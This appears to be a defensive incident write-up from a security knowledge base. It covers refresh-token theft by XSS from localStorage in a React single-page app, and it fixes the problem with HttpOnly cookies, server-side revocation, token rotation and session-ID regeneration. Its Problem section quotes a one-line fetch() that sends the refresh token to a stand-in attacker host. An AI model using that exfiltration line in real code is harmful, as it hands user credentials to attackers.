---
scenario_id: 2026-06-05-token-in-localstorage-xss-exfil
contributed_at: 2026-06-05
plugin: auth-identity
product: oauth-oidc
product_version: "unknown"
scope: likely-general
tags: [xss, localstorage, token-theft, httponly-cookie, session-fixation]
confidence: high
reviewed: false
---

## Problem

A React SPA stored its access **and** refresh token in `localStorage` so the app "stayed logged in across reloads." A reflected XSS in a third-party charting widget let an attacker run `fetch('https://evil/c?t='+localStorage.getItem('refresh_token'))` from the victim's origin. Because the refresh token was long-lived and non-rotating, the attacker minted fresh access tokens for days — the user "logging out" did nothing, since logout only cleared `localStorage` client-side and never revoked the token server-side. A second, quieter finding: the session ID was never regenerated at login, so a pre-auth fixation token kept working post-login.

## Context

- Surface: pure-static SPA (no server in the loop) talking to a separate API; managed-provider SDK was available but bypassed because someone "wanted full control of token storage."
- Constraint: single XSS = total token disclosure is the **defining** property of `localStorage`/`sessionStorage` — both are readable by *any* JS in the origin (CLAUDE.md §3, OWASP). The fix is architectural, not a sanitizer patch — you cannot XSS-proof a real app of any size.
- This is a concrete auth/token change → **mandatory `ravenclaude-core/security-reviewer`** before it ships (CLAUDE.md §8).

## Attempts

- Tried: "sanitize the widget input so the XSS can't fire." Outcome: rejected as the load-bearing control — input sanitization reduces XSS *frequency* but a single miss still discloses every token; storage location is the actual exposure. Treated only as defense-in-depth.
- Tried: move the **refresh** token to an `HttpOnly + Secure + SameSite` cookie the browser sends automatically and JS cannot read, keep the **access** token in memory only (lost on reload, re-minted via the cookie). Outcome: the XSS can still call the API *while the page is open* (it rides the same origin) but can no longer **exfiltrate** a reusable credential — the blast radius drops from "days of access from anywhere" to "the open tab's lifetime." This is the `never-store-tokens-in-localstorage` best-practice realized.
- Tried (completing the fix): add a real server-side **revoke on logout** + **refresh-token rotation with reuse detection** (a replayed rotated token revokes the whole family), and **regenerate the session identifier at login** to kill the fixation path. Outcome: logout now invalidates the credential server-side; a stolen-then-rotated token trips reuse detection.

## Resolution

The exposure was the **storage location plus a non-revocable, non-rotating refresh token**, not the specific XSS bug. Moving the refresh token to an HttpOnly cookie + memory-only access token, adding server-side revoke-on-logout, refresh rotation with reuse detection, and session-ID regeneration at login closed it. The SPA accepted a re-auth on hard reload as the cost.

**Action for the next engineer hitting this pattern:** if you find a token in `localStorage`/`sessionStorage`, that *is* the finding — don't accept "but we sanitize inputs" as the fix. Move the refresh token to an HttpOnly+Secure+SameSite cookie, access token to memory, and verify logout revokes **server-side** (not just clears storage) and that the session ID rotates at login. Traverse the **session-vs-JWT + token-storage** tree in [`../knowledge/auth-identity-decision-trees.md`](../knowledge/auth-identity-decision-trees.md) and route the change through `security-reviewer`.

**Sources (retrieved 2026-06-05):**
- OWASP — HTML5 Security / DOM-based XSS + Session Management Cheat Sheets (token storage; session-fixation: regenerate the session ID on authentication) — https://cheatsheetseries.owasp.org/
- Plugin best-practices: [`../best-practices/never-store-tokens-in-localstorage.md`](../best-practices/never-store-tokens-in-localstorage.md), [`../best-practices/prevent-session-fixation.md`](../best-practices/prevent-session-fixation.md), [`../best-practices/revoke-tokens-on-logout.md`](../best-practices/revoke-tokens-on-logout.md), [`../best-practices/rotate-refresh-tokens-on-use.md`](../best-practices/rotate-refresh-tokens-on-use.md)

OWASP guidance is stable but versioned; `[verify-at-use]` the current cheat-sheet revision before quoting a specific clause.
